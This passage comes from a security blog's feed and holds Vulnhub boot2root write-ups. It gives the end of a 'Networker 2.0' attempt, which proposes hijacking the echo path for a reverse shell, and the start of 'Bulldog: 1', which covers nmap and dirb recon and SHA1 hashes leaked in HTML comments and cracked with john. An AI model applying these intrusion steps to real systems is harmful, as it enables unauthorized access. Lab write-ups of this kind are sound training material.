&lt;span class="code-line"&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Networker&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ifconfig&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ping&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echo linux tool version 5&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So &lt;code&gt;ping&lt;/code&gt; and &lt;code&gt;ifconfig&lt;/code&gt; seem to be loaded from an absolute path but not the &lt;code&gt;echo&lt;/code&gt; command. We shall be able to
make our own echo binary and change the path to execute our binary (a reverse shell) instead of echo.&lt;/p&gt;
&lt;p&gt;But the binary use the absolute path and we didn't achieve to be root.
Let me know if you were able to get root from there (no bruteforce on the hadi user :D).&lt;/p&gt;
&lt;p&gt;Thanks to Hadi for the VM and thanks to vulnhub.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="vulnhub"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>Vulnhub, Bulldog: 1</title><link href="https://maggick.fr/2017/11/vulnhub-bulldog-1.html" rel="alternate"></link><published>2017-11-10T19:10:00+01:00</published><updated>2017-11-10T19:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2017-11-10:/2017/11/vulnhub-bulldog-1.html</id><summary type="html">&lt;p&gt;&lt;img alt="Bulldog homepage" class="align-left" src="/media/2017.11/1.png" width="162"/&gt;&lt;/p&gt;
&lt;p&gt;At the moment I have some times to work again on Vulnhub virtual machine. So here I picked
the first one at the moment:
&lt;a href="https://www.vulnhub.com/entry/bulldog-1,211/"&gt;Bulldog: 1&lt;/a&gt;
A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Nick Frichette&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2017.11/1.png" alt="Bulldog homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;At the moment I have some times to work again on Vulnhub virtual machine. So here I picked
the first one at the moment:
&lt;a href="https://www.vulnhub.com/entry/bulldog-1,211/"&gt;Bulldog: 1&lt;/a&gt;
A simple boot2root machine by &lt;a href="https://twitter.com/frichette_n"&gt;Nick Frichette&lt;/a&gt;.&lt;/p&gt;


&lt;h2 id="discovery"&gt;Discovery&lt;/h2&gt;
&lt;p&gt;The MOTD of the machine give us its IP address so we can directly launch a nmap at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# nmap -sSV 10.0.2.4&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-09 14:00 CET&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.0.2.4&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.00057s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 997 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)&lt;/span&gt;
&lt;span class="code-line"&gt;MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is a ssh service running on port 23 and two web servers on port 80 and
8080. The server on both port seems to be the same and talks dogs photographies.&lt;/p&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Website screenshot" src="/media/2017.11/1.png"&gt;&lt;/p&gt;
&lt;p&gt;We run &lt;code&gt;dirb&lt;/code&gt; on the web server on the port 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dirb&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----------------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;DIRB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="mf"&gt;.22&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;By&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dark&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Raver&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----------------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;START_TIME&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Thu&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nov&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;URL_BASE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;WORDLIST_FILES&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dirb&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;wordlists&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;common&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----------------&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;GENERATED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;WORDS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4612&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Scanning&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DIRECTORY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;==&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DIRECTORY&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;10.0.2.4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;robots&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nl"&gt;CODE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="k"&gt;SIZE&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1071&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The result is the same on the port 8080&lt;/p&gt;
&lt;p&gt;The admin page present a django login interface.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Django login page" src="/media/2017.11/2.png"&gt;&lt;/p&gt;
&lt;p&gt;The dev page contain the link to a web-shell and contact information with some hashes in html comments &lt;code&gt;view-source:http://10.0.2.4/dev/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Team&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;Lead&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;alan&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;6515229&lt;/span&gt;&lt;span class="n"&gt;daf8dbdc8b89fed2e60f107433da5f2cb&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Back&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Team&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;Lead&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;william&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;38882&lt;/span&gt;&lt;span class="n"&gt;f3b81f8f2bc47d9f3119155b05f954892fb&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Front&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;malik&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;c6f7e34d5d08ba4a40dd5627508ccb55b425e279&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Front&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;kevin&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mf"&gt;0e6&lt;/span&gt;&lt;span class="n"&gt;ae9fe8af1cd4192865ac97ebf6bda414218a9&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Back&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ashley&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;553&lt;/span&gt;&lt;span class="n"&gt;d917a396414ab99785694afd51df3a8a8a3e0&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Back&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nick&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;ddf45997a7e18a25ad5f5cf222da64814dd060d5&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Database&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sarah&lt;/span&gt;&lt;span class="nv"&gt;@bulldogindustries&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;br&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="c1"&gt;--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch john against the hashes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@kalili&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="n"&gt;bulldog&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;john&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hashes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nf"&gt;format&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;Raw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SHA1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Using&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;input&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;encoding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UTF&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Loaded&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hashes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;no&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;different&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;salts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Raw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SHA1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;SHA1 128/128 AVX 4x&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Press&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;abort&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;almost&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;bulldog&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nick&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.004714&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12965&lt;/span&gt;&lt;span class="n"&gt;Kp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12965&lt;/span&gt;&lt;span class="n"&gt;Kc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;77831&lt;/span&gt;&lt;span class="n"&gt;KC&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hmj359t&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;hmj359l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Nick use a weak password and it can be used to login into the Django admin interface but he has no access.&lt;/p&gt;
